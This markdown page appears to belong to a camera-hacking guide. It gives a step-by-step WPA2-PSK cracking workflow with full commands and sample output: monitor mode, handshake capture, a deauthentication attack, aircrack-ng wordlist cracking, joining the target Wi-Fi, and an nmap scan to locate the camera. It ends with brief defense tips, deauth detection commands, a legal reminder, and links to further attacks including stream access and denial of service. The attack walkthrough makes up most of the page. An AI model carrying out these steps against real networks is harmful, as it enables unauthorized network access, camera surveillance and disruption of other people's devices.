# Network Penetration - WPA2 Cracking Workflow

## 🎯 Objective

Gain access to the camera's network by capturing and cracking the WPA2-PSK password.

---

## 📋 Prerequisites

- Kali Linux or similar penetration testing OS
- Wireless adapter supporting monitor mode
- Aircrack-ng suite installed
- Wireshark for packet analysis

---

## 🔍 Phase 1: Wireless Reconnaissance

### Step 1: Prepare Wireless Adapter

```bash
# Check current interface status
iwconfig

# Expected output:
# wlan0     IEEE 802.11  ESSID:off/any
#           Mode:Managed  Access Point: Not-Associated
```

---

### Step 2: Kill Interfering Processes

```bash
# Stop processes that might interfere
sudo airmon-ng check kill
```

**Output:**
```
Killing these processes:

  PID Name
  1234 NetworkManager
  5678 wpa_supplicant
```

**Note:** This will disconnect you from current Wi-Fi. Use ethernet if needed.

---

### Step 3: Enable Monitor Mode

```bash
# Start monitor mode on wlan0
sudo airmon-ng start wlan0
```

**Output:**
```
PHY     Interface       Driver          Chipset

phy0    wlan0           ath9k_htc       Atheros Communications, Inc. AR9271
                (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
                (mac80211 station mode vif disabled for [phy0]wlan0)

Interface wlan0mon created successfully
```

---

### Step 4: Verify Monitor Mode

```bash
# Check interface is in monitor mode
iwconfig wlan0mon
```

**Expected:**
```
wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz  Tx-Power=20 dBm
```

✅ Mode shows "Monitor" - Ready to proceed

---

## 📡 Phase 2: Target Identification

### Step 5: Scan for Networks

```bash
# Start scanning all channels
sudo airodump-ng wlan0mon
```

**Output:**
```
CH 11 ][ Elapsed: 24 s ][ 2024-12-07 14:30:15

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 AA:BB:CC:DD:EE:FF  -45       89      234   15   11  270   WPA2 CCMP   PSK  Tenda_E47AC8
 11:22:33:44:55:66  -67       42       12    2    6  195   WPA2 CCMP   PSK  Neighbor_WiFi
 77:88:99:AA:BB:CC  -82       15        0    0    1  130   WPA2 CCMP   PSK  Another_Network
```

---

### Step 6: Identify Target Network

**Record the following:**
- **ESSID (Network Name):** Tenda_E47AC8
- **BSSID (MAC Address):** AA:BB:CC:DD:EE:FF
- **Channel:** 11
- **Encryption:** WPA2 CCMP PSK

**Tip:** Look for strong signal (PWR closer to 0 = stronger)

---

## 🎣 Phase 3: Handshake Capture

### Step 7: Focus on Target Network

```bash
# Capture only the target network
sudo airodump-ng -c 11 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
```

**Parameters:**
- `-c 11`: Lock to channel 11
- `--bssid AA:BB:CC:DD:EE:FF`: Filter for target AP
- `-w capture`: Write to file (creates capture-01.cap)
- `wlan0mon`: Monitor interface

---

### Step 8: Wait for Connected Clients

**Watch the bottom section:**
```
 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 AA:BB:CC:DD:EE:FF  CC:DD:EE:FF:00:11  -52   54e-54e    0       89
```

**Key Information:**
- **STATION:** CC:DD:EE:FF:00:11 (Connected device - could be the camera)

---

### Step 9: Deauthentication Attack

**Why?** Force client to reconnect and capture the 4-way handshake

**Open a NEW terminal:**

```bash
# Send deauth packets to force reconnection
sudo aireplay-ng --deauth 10 \
  -a AA:BB:CC:DD:EE:FF \
  -c CC:DD:EE:FF:00:11 \
  wlan0mon
```

**Parameters:**
- `--deauth 10`: Send 10 deauth packets
- `-a AA:BB:CC:DD:EE:FF`: Access Point BSSID
- `-c CC:DD:EE:FF:00:11`: Client MAC to deauth

**Output:**
```
14:35:45  Waiting for beacon frame (BSSID: AA:BB:CC:DD:EE:FF) on channel 11
14:35:45  Sending 64 directed DeAuth (code 7). STMAC: [CC:DD:EE:FF:00:11] [ACK]
14:35:46  Sending 64 directed DeAuth (code 7). STMAC: [CC:DD:EE:FF:00:11] [ACK]
```

---

### Step 10: Verify Handshake Capture

**In the airodump-ng window, look for:**

```
CH 11 ][ Elapsed: 1 min ][ 2024-12-07 14:36 ][ WPA handshake: AA:BB:CC:DD:EE:FF
```

✅ **"WPA handshake: [BSSID]"** appears in top-right corner

**Stop the capture:** Press `Ctrl+C`

---

## 🔬 Phase 4: Handshake Verification

### Step 11: Verify with Wireshark

```bash
# Open capture file
wireshark capture-01.cap
```

---

### Step 12: Filter for EAPOL Frames

**In Wireshark filter bar:**
```
eapol
```

---

### Step 13: Verify 4-Way Handshake

**Look for this sequence:**

```
Frame 1: EAPOL Key (Message 1 of 4)
Frame 2: EAPOL Key (Message 2 of 4)
Frame 3: EAPOL Key (Message 3 of 4)
Frame 4: EAPOL Key (Message 4 of 4)
```

✅ All 4 messages present = Complete handshake captured

---

## 🔓 Phase 5: Password Cracking

### Step 14: Prepare Wordlist

**Option 1: Use existing wordlist**
```bash
# Common wordlists on Kali
ls /usr/share/wordlists/

# Example: rockyou.txt (contains millions of passwords)
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

**Option 2: Create custom wordlist**
```bash
nano pass.txt
```

Add likely passwords:
```
Mohammed1234
password123
admin123
12345678
Tenda2024
```

---

### Step 15: Crack the Password

```bash
# Run aircrack-ng
sudo aircrack-ng -w pass.txt capture-01.cap
```

**Parameters:**
- `-w pass.txt`: Wordlist file
- `capture-01.cap`: Capture file with handshake

---

### Step 16: Wait for Success

**Output (Running):**
```
Reading packets, please wait...
Opening capture-01.cap
Read 2847 packets.

   #  BSSID              ESSID                     Encryption

   1  AA:BB:CC:DD:EE:FF  Tenda_E47AC8             WPA (1 handshake)

Choosing first network as target.

Reading packets, please wait...
Opening capture-01.cap
Read 2847 packets.

1 potential targets

                               Aircrack-ng 1.6

      [00:00:05] 234/879 keys tested (46.80 k/s)

      Time left: 14 seconds                                   26.61%

                        KEY FOUND! [ Mohammed1234 ]
```

✅ **Password Found:** Mohammed1234

---

## 🔌 Phase 6: Network Connection

### Step 17: Restore Normal Mode

```bash
# Stop monitor mode
sudo airmon-ng stop wlan0mon

# Restart NetworkManager
sudo systemctl restart NetworkManager
```

---

### Step 18: Connect to Network

**Method 1: Using nmcli (Command Line)**
```bash
# Connect to the network
nmcli dev wifi connect "Tenda_E47AC8" password "Mohammed1234"
```

**Method 2: Using GUI**
1. Click Wi-Fi icon in system tray
2. Select "Tenda_E47AC8"
3. Enter password: Mohammed1234
4. Connect

---

### Step 19: Verify Connection

```bash
# Check connection status
nmcli connection show --active

# Check IP address
ifconfig wlan0
```

**Expected:**
```
wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.105  netmask 255.255.255.0  broadcast 192.168.0.255
        ether aa:bb:cc:dd:ee:ff  txqueuelen 1000  (Ethernet)
```

---

### Step 20: Test Connectivity

```bash
# Ping the gateway
ping -c 3 192.168.0.1

# Should see successful responses
```

---

## 🎯 Phase 7: Camera Discovery

### Step 21: Network Scan

```bash
# Discover all devices on network
sudo nmap -sn 192.168.0.0/24
```

**Output:**
```
Starting Nmap 7.93
Nmap scan report for 192.168.0.1
Host is up (0.0020s latency).
MAC Address: AA:BB:CC:11:22:33 (Tenda Technology)

Nmap scan report for 192.168.0.100
Host is up (0.0023s latency).
MAC Address: BB:CC:DD:EE:FF:00 (TP-Link Technologies)  ← Camera found!

Nmap scan report for 192.168.0.105
Host is up.
```

✅ **Camera identified:** 192.168.0.100

---

## 📊 Success Metrics

| Step | Time Required | Success Rate |
|------|--------------|--------------|
| Monitor Mode Setup | 1-2 minutes | 100% |
| Network Scan | 1 minute | 100% |
| Handshake Capture | 2-5 minutes | 95%+ |
| Password Cracking | 5 seconds - hours | Depends on password |
| Network Connection | 30 seconds | 100% |
| Camera Discovery | 1 minute | 100% |

---

## 🛡️ Defense Recommendations

### For Network Owners

1. **Use Strong WPA2/WPA3 Passwords**
```
✓ Minimum 20 characters
✓ Random uppercase, lowercase, numbers, symbols
✓ Example: aB9#mK2$pL7@qR5!xT3%
✗ Avoid: Names, dates, dictionary words
```

2. **Enable WPA3 (if available)**
```
Router Settings → Wireless Security
Security Mode: WPA3-Personal
```

3. **Disable WPS**
```
Router Settings → WPS
☐ Disable WPS
```

4. **Hide SSID (Minor Defense)**
```
Router Settings → Wireless
☐ Broadcast SSID
```
**Note:** This is security by obscurity only

5. **MAC Address Filtering (Additional Layer)**
```
Router Settings → Wireless → MAC Filter
✓ Enable MAC Filtering
Add allowed devices only
```

---

### Detection Methods

**Monitor for Deauth Attacks:**
```bash
# Use Wireshark to detect excessive deauth frames
tshark -i wlan0 -Y "wlan.fc.type_subtype == 0x0c" -T fields -e wlan.ta

# High count of deauth frames = possible attack
```

**Use Wireless IDS:**
```bash
# Install and run Kismet
sudo apt-get install kismet
sudo kismet
```

---

## ⚠️ Troubleshooting

### Problem: No handshake captured

**Solutions:**
1. Wait longer - client may not reconnect immediately
2. Send more deauth packets: `--deauth 50`
3. Deauth all clients: Remove `-c` parameter
4. Check if WPA3 is enabled (different handshake)

---

### Problem: aircrack-ng shows no handshake

**Solutions:**
```bash
# Verify handshake in file
aircrack-ng capture-01.cap

# Look for "1 handshake" in output
# If shows "0 handshake", recapture
```

---

### Problem: Password not in wordlist

**Solutions:**
1. Use larger wordlist (rockyou.txt)
2. Create targeted wordlist with:
   - Router model + common passwords
   - Owner name + dates
   - Common patterns

---

### Problem: Monitor mode fails

**Solutions:**
```bash
# Check if adapter supports monitor mode
airmon-ng

# If not listed, adapter doesn't support it
# Solution: Use compatible adapter (e.g., ALFA AWUS036ACS)
```

---

## 🎓 Key Takeaways

1. **WPA2-PSK handshake capture is straightforward**
2. **Password strength is critical** - weak passwords crack instantly
3. **Deauthentication is powerful but detectable**
4. **WPA3 provides better protection** against offline cracking
5. **Network access is just the first step** of camera compromise

---

## 🔗 Next Steps

After gaining network access:

1. ✅ [Service Discovery](onvif-exploitation.md) - Find camera ports
2. ✅ [ONVIF Exploitation](onvif-exploitation.md) - Credential enumeration
3. ✅ [PTZ Manipulation](ptz-manipulation.md) - Physical control
4. ✅ [Stream Access](stream-access.md) - View live video
5. ✅ [Denial of Service](denial-of-service.md) - Disrupt camera

---

**⚠️ Legal Reminder:**

This technique is for **authorized testing only**. Unauthorized access to wireless networks is illegal under:
- Computer Fraud and Abuse Act (CFAA)
- Wireless communication interception laws
- State computer crime statutes

**Penalties:** Fines and imprisonment

---

*Use responsibly to improve security, not to cause harm.* 🔐📡